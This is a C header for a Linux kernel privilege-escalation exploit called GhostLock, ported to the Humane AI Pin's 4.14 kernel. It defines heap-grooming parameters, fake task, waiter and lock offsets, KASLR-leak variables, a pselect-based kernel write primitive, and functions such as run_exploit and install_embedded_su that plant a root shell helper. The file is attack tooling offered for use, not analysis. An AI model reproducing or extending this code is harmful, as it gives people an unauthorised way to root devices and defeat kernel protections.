/*
 * SPDX-License-Identifier: Apache-2.0
 * Humane AI Pin 4.14 port, 2026.
 *
 * New device-specific adaptation of the NebuSec/CyberMeowfia GhostLock
 * implementation. Changed for the atoll allocator and 4.14 waiter layout.
 */
#ifndef GHOSTLOCK_AIPIN_COMMON_H
#define GHOSTLOCK_AIPIN_COMMON_H

#define __ARM 1
#define _GNU_SOURCE

#include <unistd.h>
#include <time.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdint.h>
#include <stdatomic.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <sched.h>
#include <linux/futex.h>
#include <sys/mman.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/resource.h>

#include "offset.h"
#include "reclaim_hold.h"

#define PAGE_SHIFT 12
#define PAGE_SIZE (1UL << PAGE_SHIFT)
#define KS_PAGE_MASK ((1UL << PAGE_SHIFT) - 1)
#define KS_PAGE_SIZE (1UL << PAGE_SHIFT)

#include "kernelsnitch/utils.h"

/* Profile-bound mm_struct object and SLUB geometry. */
#define MM_STRUCT_OBJECT_SZ PROFILE_MM_OBJECT_SIZE
#define MM_STRUCT_SZ PROFILE_MM_SLAB_SIZE
#define MM_ORDER PROFILE_MM_ORDER
#define MM_PREPARE_SLABS_MIN 16
#define MM_PREPARE_SLABS_MAX 64
#define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)

_Static_assert((ORDER3_SIZE / MM_STRUCT_SZ) == PROFILE_MM_OBJECTS_PER_SLAB,
               "profile mm_struct objects-per-slab mismatch");

#define CORE 0
#define CONSUMER_CORE 1
#define KSNITCH_COLLISIONS 6
#define KERNELSNITCH_IDENTITY_START P0_PAGE_OFFSET
#define KERNELSNITCH_IDENTITY_END (P0_PAGE_OFFSET + (256ULL << 30))
#define DIRECT_MAP_BASE P0_PAGE_OFFSET

#define LOCK_OFF 0x1350
#define W0_OFF 0x2220
#define FAKE_TASK_OFF 0x3200
#define FAKE_TASK_PRIO 120
#define FAKE_WAITER_PRIO 130

#define SKB_DATA_DELTA (-0xe80LL)
#define SKB_SEND_SIZE (ORDER3_SIZE * 2)
#define SKB_RECLAIM_SIZE (ORDER3_SIZE - SKB_DATA_DELTA)
#define SKB_RECLAIM_SENDS 128
#define SKB_RECLAIM_PAIRS 32
#define SKB_ABSORB_PAIRS 8
#define SKB_ABSORB_SENDS_PER_PAIR 3
#define RECLAIM_ORDER0_PREFILL_MB 8
#define SKB_PERF_GATE_RECLAIM_SENDS 4096
#define SKB_PERF_GATE_RECLAIM_PAIRS 128
#define SKB_PERF_GATE_POLL_INTERVAL 8

_Static_assert(SKB_SEND_SIZE == 0x10000, "reclaim send must be 64 KiB");
_Static_assert(SKB_RECLAIM_SIZE == 0x8e80, "unexpected skb allocation size");
_Static_assert(SKB_RECLAIM_SENDS == GHOSTLOCK_RECLAIM_SENDS,
               "reclaim send count mismatch");
_Static_assert(SKB_RECLAIM_PAIRS == GHOSTLOCK_RECLAIM_PAIRS,
               "reclaim pair count mismatch");
_Static_assert(SKB_PERF_GATE_RECLAIM_PAIRS <= GHOSTLOCK_RECLAIM_MAX_PAIRS,
               "perf gate needs too many socket pairs");

#define PSELECT_ROUTE_NFDS 320
#define PSELECT_ROUTE_WORDS_PER_SET 5
#define PSELECT_ROUTE_SENTINEL_FD 63
#define PSELECT_ROUTE_HIGH_FD 512
#define PSELECT_TIMEOUT_SEC 5
#define PSELECT_CONSUMER_NICE 19
#define PSELECT_CONSUMER_BURST_CALLS 1
#define PSELECT_ENTER_DELAY_USEC 50000
#define CONSUMER_MAX_CALLS 1
#define ROUTE_WAIT_SECONDS 8
#define DIRECT_FOLLOWUP_ATTEMPTS 10

#define WAITER_QWORDS (TARGET_WAITER_SIZE / sizeof(uint64_t))
_Static_assert(WAITER_QWORDS == 10, "4.14 waiter must contain ten qwords");
_Static_assert(PSELECT_ROUTE_NFDS == PSELECT_ROUTE_WORDS_PER_SET * 64,
               "pselect layout assumes five words per fd set");

#define P0_KERNEL_PHYS_DELTA (P0_KERNEL_PHYS_LOAD - P0_PHYS_OFFSET)
#define P0_DATA_ALIAS_CONST(image_addr) \
  (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))
#define SLIDE_NFULNL_LOGGER P0_DATA_ALIAS_CONST(SLIDE_NFULNL_LOGGER_IMAGE)

#define PAGE_PAYLOAD_WRITE 0
#define PAGE_PAYLOAD_READ 1
#define PAGE_PAYLOAD_FOPS PAGE_PAYLOAD_WRITE
#define PAGE_PAYLOAD_SLIDE PAGE_PAYLOAD_READ
#define FOPS_KERNEL_PAGE_SETUP_ATTEMPTS 72
#define SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS 12

struct mm_ctx {
  int *memfds;
  size_t mm_cnt;
};

struct local_sched_attr {
  uint32_t size;
  uint32_t sched_policy;
  uint64_t sched_flags;
  int32_t sched_nice;
  uint32_t sched_priority;
  uint64_t sched_runtime;
  uint64_t sched_deadline;
  uint64_t sched_period;
};

struct pselect_waiter_stamp {
  fd_set read_set;
  fd_set write_set;
  fd_set except_set;
  uint64_t expected[WAITER_QWORDS];
  int ready_fd;
  int peer_fd;
  int ready_count;
  int duplicated_count;
};

extern uintptr_t pselect_custom_value;
extern uintptr_t pselect_custom_target;
extern uintptr_t fake_task;
extern uintptr_t fake_w0;
extern uintptr_t fake_lock;
extern uintptr_t page_base;
extern int pselect_custom_shape;
extern int direct_root_cpu;

extern uint64_t kaslr_base;
extern uint64_t kaslr_slide;
extern uint64_t p0_linear_delta;
extern int p0_slide_leak;

extern uint32_t f_wait;
extern uint32_t f_pi_target;
extern uint32_t f_pi_chain;
extern atomic_int waiter_ready;
extern atomic_int waiter_waiting;
extern atomic_int owner_started;
extern atomic_int owner_chain_done;
extern atomic_int route_done;
extern atomic_int waiter_tid;
extern atomic_int punch_consume_go;
extern atomic_int punch_consume_stop;
extern atomic_int consumer_calls;
extern atomic_int consumer_success;
extern atomic_int main_route_delay_usec;

int run_exploit(int argc, char **argv);
int install_embedded_su(pid_t *daemon_pid);
void read_first_line(const char *path, char *buf, size_t len);
void log_startup_context(void);
void log_slide_child_context(void);
void disable_rseq_for_thread(void);
long futex_op(uint32_t *uaddr, int op, uint32_t val,
              const struct timespec *timeout, uint32_t *uaddr2,
              uint32_t val3);
long sched_setattr_tid(int tid, int nice_value);

int init_direct_root_cpu(void);
int restore_initial_affinity(void);
int p0_env_init(void);
uintptr_t p0_runtime_alias(uintptr_t image_addr);
uintptr_t canon_addr(uintptr_t image_addr);
uintptr_t text_addr(uintptr_t image_addr);
uintptr_t kaslr_image_addr(uintptr_t image_addr);
uintptr_t p0_alias_image_offset(uintptr_t data_alias);
int is_kernel_ptr(uintptr_t value);
int is_direct_ptr(uintptr_t value);

void set_pselect_write(uintptr_t target, uintptr_t value, int shape);
uintptr_t pselect_write_target(void);
uintptr_t pselect_write_value(void);
int pselect_write_shape(void);
void put64(unsigned char *p, size_t off, uint64_t value);
void put32(unsigned char *p, size_t off, uint32_t value);
int prepare_skb_payload(uintptr_t base, int payload_mode);
uintptr_t prepare_good_kernel_page(int payload_mode);
void close_reclaim_sockets(void);
void cleanup_page_prepare_state(void);

void fdset_put_word(fd_set *set, int word, uint64_t value);
uint64_t fdset_get_word(const fd_set *set, int word);
int pselect_prepare_waiter_stamp(struct pselect_waiter_stamp *stamp,
                                 const uint64_t words[WAITER_QWORDS]);
int pselect_execute_waiter_stamp(struct pselect_waiter_stamp *stamp);
int pselect_waiter_stamp_matches(const struct pselect_waiter_stamp *stamp);
int prepare_pselect_fake_lock_route(void);
void do_pselect_fake_lock_route(void);

void reset_main_route_state(void);
void run_main_route_threads(void);
int direct_pselect_write_once(uintptr_t target, uintptr_t value,
                              int shape, int sequence);
int direct_pselect_write_followup_once(uintptr_t target, uintptr_t value,
                                       int shape, int sequence,
                                       uintptr_t followup_target,
                                       int followup_sequence);

int hex_value(char c);
int slide_leak_kernel_base(void);
int prepare_reclaim_trace_init(void);
void prepare_reclaim_trace_close(void);

#endif
